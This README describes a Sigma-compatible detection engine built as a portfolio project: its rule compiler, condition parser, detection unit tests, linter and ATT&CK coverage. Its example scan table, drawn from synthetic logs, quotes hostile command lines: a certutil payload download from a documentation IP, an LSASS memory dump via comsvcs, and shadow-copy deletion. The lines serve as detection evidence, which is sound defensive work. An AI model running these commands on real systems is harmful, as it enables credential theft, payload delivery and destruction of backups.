# sigma-detection-engine

A **Sigma-compatible detection engine** with a **detection-as-code** workflow:
write rules in the open [Sigma](https://sigmahq.io) format, unit-test them with
true/false-positive cases, lint them in CI, and map them onto MITRE ATT&CK.
Then run them over Sysmon-style JSON logs to get a per-host attack timeline.

Built from scratch (PyYAML is the only dependency) so the matching semantics,
condition grammar and test harness are all visible and tested — no black-box
SIEM backend.

```
 rules/*.yml ──► lint ──► compile ──► scan events.jsonl ──► alerts + host timeline (Markdown / JSON)
                  │          │
                  │          └──► test  rule-tests/*.yml  (match / no_match cases, coverage %)
                  └──► coverage  ATT&CK tactic × technique matrix + tactic gaps
```

## Why this project

Detection engineering is now a core blue-team skill: SOC and IR teams ship
detections like software — version-controlled, peer-reviewed, regression
tested. This project demonstrates that workflow end to end:

| Capability | What it shows |
|---|---|
| Sigma rule compiler | Understanding of the detection-rule spec: field modifiers, wildcards, case-insensitivity, `1 of selection_*`, `all of them`, filters |
| Condition parser | A hand-written recursive-descent parser with correct `not` > `and` > `or` precedence and compile-time validation of identifiers |
| Detection unit tests | Each rule ships with positive **and** negative cases; the harness reports failures, orphaned tests, untested rules and rules lacking a negative case |
| Linter | Catches bad UUIDs, invalid levels/status, malformed ATT&CK tags, unused selections, duplicate ids across the rule set |
| ATT&CK coverage | Tactic → technique matrix with explicit gap reporting, for planning what to write next |
| Analyst output | Alerts grouped per host in time order, with the evidence field (command line, or `image -> ip:port`) that triggered them |

> **The harness earned its keep during development.** The first run of
> `sigma-engine test` failed the scheduled-task rule's true-positive case. Root
> cause: `|contains` was implemented by string-concatenating `*` around the
> value, so a value ending in a backslash (`\AppData\`) turned the appended
> wildcard into an *escaped literal* `\*`. The fix applies modifier wildcards
> at the regex level (as pySigma does), and a regression test pins it.

## Quick start

```bash
cd sigma-detection-engine
pip install -e ".[dev]"          # or: pip install pyyaml pytest

sigma-engine lint --strict                       # validate every rule
sigma-engine test --min-coverage 100             # run detection unit tests
sigma-engine coverage                            # ATT&CK matrix
sigma-engine scan samples/intrusion_chain.jsonl  # hunt through logs
```

(`python -m sigma_engine ...` works without installing.)

### Example: scanning the bundled intrusion

`samples/intrusion_chain.jsonl` is a synthetic 22-event Sysmon-style dataset:
a phishing macro on `WS-FIN-07` that runs encoded PowerShell, enumerates
Domain Admins, stages a DLL with certutil, persists via a scheduled task,
beacons out, dumps LSASS and deletes shadow copies; plus a reverse shell on a
Linux web server and a benign host full of near-miss noise (SCCM encoded
scripts, `schtasks /query`, internal SMB, `vssadmin list`).

```
$ sigma-engine scan samples/intrusion_chain.jsonl
- **Events scanned:** 22
- **Alerts:** 11
- **By severity:** critical: 3, high: 5, medium: 3

### WS-FIN-07.corp.example
| Time                    | Level    | Rule                                           | Techniques           | Evidence |
| 2026-11-18 09:14:52.901 | high     | Office Application Spawning Script Interpreter | T1204.002, T1566.001 | `cmd.exe /c powershell -nop -w hidden -enc SQBF…` |
| 2026-11-18 09:16:31.882 | medium   | Domain Account And Group Discovery             | T1069.002, T1087.002 | `net group "Domain Admins" /domain` |
| 2026-11-18 09:18:02.771 | high     | Certutil Used To Download Or Decode Payload    | T1105, T1140         | `certutil.exe -urlcache -split -f http://203.0.113.50/u.b64 …` |
| 2026-11-18 09:19:44.218 | high     | LOLBin Network Connection To Public IP         | T1071.001, T1218     | `rundll32.exe -> 203.0.113.50:443` |
| 2026-11-18 09:31:12.090 | critical | LSASS Memory Dump via Comsvcs MiniDump …       | T1003.001            | `rundll32.exe …comsvcs.dll, MiniDump 712 …` |
| 2026-11-18 10:02:55.731 | critical | Volume Shadow Copy Deletion                    | T1490                | `vssadmin.exe delete shadows /all /quiet` |
...
```

The benign host produces **zero** alerts — the filters (`not filter_sccm`,
`DestinationIp|cidr` private ranges) and logsource scoping do their job.

### CI gating

Every subcommand returns a meaningful exit code, so the rule repo can gate
merges and the scanner can gate pipelines:

| Command | Exit 1 when |
|---|---|
| `lint [--strict]` | any error (or warning with `--strict`) |
| `test [--min-coverage N]` | any case fails, a test targets an unknown rule, or coverage < N% |
| `scan --fail-on LEVEL` | any alert at or above `LEVEL` |

Exit code `2` means bad input (invalid rule, missing file).

## Writing rules and tests

Rules are standard Sigma YAML (see `rules/`). Tests live in `rule-tests/` and
reference a rule by `id`:

```yaml
rule_id: 73c7c4e3-25c5-4ed9-8da1-64bfb7da6247
cases:
  - name: slash variant and mixed case (windash)
    expect: match
    event:
      Image: 'C:\Program Files\PowerShell\7\pwsh.exe'
      CommandLine: 'pwsh /EnC SQBFAFgA'
  - name: SCCM client filtered out
    expect: no_match
    event:
      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
      CommandLine: 'powershell.exe -enc SQBFAFgA'
      ParentImage: 'C:\Windows\CCM\CcmExec.exe'
```

## Supported Sigma features

| Area | Supported |
|---|---|
| Detection structure | field maps (AND), lists of maps (OR), value lists (OR), keyword lists (full-event search), nested/dotted fields, `null` |
| Value modifiers | `contains`, `startswith`, `endswith`, `all`, `re`, `cidr` (IPv4/IPv6), `base64`, `windash`, `exists`, `gt`, `gte`, `lt`, `lte` |
| Wildcards | `*`, `?`, with `\*` / `\?` / `\\` escapes; matching is case-insensitive (except `re`) |
| Conditions | `and`, `or`, `not`, parentheses, `1 of`, `any of`, `all of`, `N of`, `them` (excludes `_`-prefixed ids), list-of-conditions |
| Logsource | events may carry `logsource: {product, category, service}`; rules only evaluate matching events (unlabelled events are evaluated by all rules) |
| Explainability | each alert lists the detection identifiers that fired |

**Not implemented** (deliberately out of scope): correlation/aggregation rules
(`| count() by`, `timeframe`), `base64offset`, `expand` placeholders, and
backend conversion to SIEM query languages.

## Bundled rules

| Rule | Level | ATT&CK |
|---|---|---|
| Office Application Spawning Script Interpreter | high | T1566.001, T1204.002 |
| PowerShell Execution With Encoded Command | high | T1059.001, T1027 |
| Domain Account And Group Discovery | medium | T1087.002, T1069.002 |
| Certutil Used To Download Or Decode Payload | high | T1105, T1140 |
| Scheduled Task Created Running From User-Writable Path | medium | T1053.005 |
| LOLBin Network Connection To Public IP | high | T1218, T1071.001 |
| LSASS Memory Dump via Comsvcs MiniDump or ProcDump | critical | T1003.001 |
| Volume Shadow Copy Deletion | critical | T1490 |
| Linux Reverse Shell Via Bash Or Netcat | critical | T1059.004, T1095 |

All 9 rules have tests (30 cases, every rule with at least one negative case).

## Project layout

```
sigma_engine/
  condition.py   recursive-descent parser for Sigma conditions -> AST
  matcher.py     detection items + modifiers -> event predicates
  rule.py        rule loading/compilation, logsource scoping, ATT&CK tags, linter
  engine.py      event ingestion (JSONL / JSON array), scanning, host timelines
  testing.py     detection-as-code test harness
  report.py      Markdown scan report, test output, ATT&CK coverage matrix
  cli.py         `sigma-engine {scan,lint,test,coverage}`
rules/           Sigma rules
rule-tests/      true/false-positive cases per rule
samples/         synthetic intrusion dataset
tests/           pytest suite (76 tests)
```

## Running the tests

```bash
pytest -q
```

## Disclaimer

Rules and sample data are original, written for this portfolio and inspired by
public detection-engineering practice; the sample logs are synthetic and use
documentation IP ranges (RFC 5737). Tune rules against your own environment
before production use.
